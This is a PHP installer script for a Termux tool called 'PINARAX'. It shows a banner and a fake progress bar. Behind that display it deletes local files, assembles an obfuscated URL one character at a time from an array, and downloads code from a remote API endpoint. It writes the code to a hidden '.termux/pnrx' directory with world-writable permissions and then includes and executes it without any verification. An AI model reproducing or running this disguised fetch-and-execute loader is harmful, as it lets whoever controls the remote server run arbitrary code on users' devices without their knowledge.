<?php

ini_set('display_errors', "0");

function pinarax_0() {
    if(file_exists('../.termux/pnrx/mode_create.php')) { unlink('../.termux/pnrx/mode_create.php'); }
    if(file_exists('../.termux/pnrx/mode_email.php')) { unlink('../.termux/pnrx/mode_email.php'); }

    system('clear');
    pinarax_cred('~ Installing Repositories... ~', 'yellow');
    //action=get_start;
    $t = array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','w','x');
    $hst = $t[7].$t[19].$t[19].$t[15].$t[18].':'.'//';
    $dr = $t[19].$t[4].$t[17].$t[12].$t[20].$t[22].'.';
    $tm = $t[15].$t[8].$t[13].$t[0].$t[17].$t[0].$t[22];
    $dm = '.'.$t[19].$t[4].$t[0].$t[12].'/'.'v'.'2'.'/'.$tm.'.'.$t[0].$t[15].$t[8].'.'.$t[15].$t[7].$t[15];
    $ur = '?'.$t[0].$t[2].$t[19].$t[8].$t[14].$t[13].'='.$t[6].$t[4].$t[19].'_'.$t[18].$t[19].$t[0].$t[17].$t[19];
    $gst = $hst.$dr.$tm.$dm.$ur;
    $get_start = file_get_contents($gst);
    if($get_start) {
        if(file_exists('../.termux/pnrx/')) {} else {
            mkdir('../.termux/pnrx/', 0777, true);
        }
        $pinarax_file = fopen('../.termux/pnrx/start.php', 'w');
        fwrite($pinarax_file, $get_start);
        echo "\033[1;32m####"; sleep(0);
        echo "\033[1;32m####"; sleep(0);
        echo "\033[1;32m#####"; sleep(0);
        echo "\033[1;32m##"; sleep(0);
        echo "\033[1;32m#######"; sleep(0);
        echo "\033[1;32m###"; sleep(0);
        echo "\033[1;32m#####"; sleep(1);
        echo "\033[1;32m######"; sleep(0);
        echo "\033[1;32m####\033[37m\n"; sleep(0);

        system('clear');
        include '../.termux/pnrx/start.php';
        pinarax_start();
    }
}

function pinarax_cred($text,$werno) {

system('clear');

echo "\033[1;32m ____  __  __ _   __   ____   __   _  _ 
(  _ \(  )(  ( \ / _\ (  _ \ / _\ ( \/ )
 ) __/ )( /    //    \ )   //    \ )  ( 
(__)  (__)\_)__)\_/\_/(__\_)\_/\_/(_/\_)\033[1;37m\n";

echo "\033[1;37m========================================\033[1;37m\n";
if($werno == 'green') { echo "\033[1;32m" . $text . "\033[1;37m\n"; }
else if($werno == 'red') { echo "\033[1;31m" . $text . "\033[1;37m\n"; }
else if($werno == 'yellow') { echo "\033[1;33m" . $text . "\033[1;37m\n"; }
else if($werno == 'white') { echo "\033[1;37m" . $text . "\033[1;37m\n";}
echo "\033[1;37m========================================\033[1;37m\n";

}

pinarax_0();
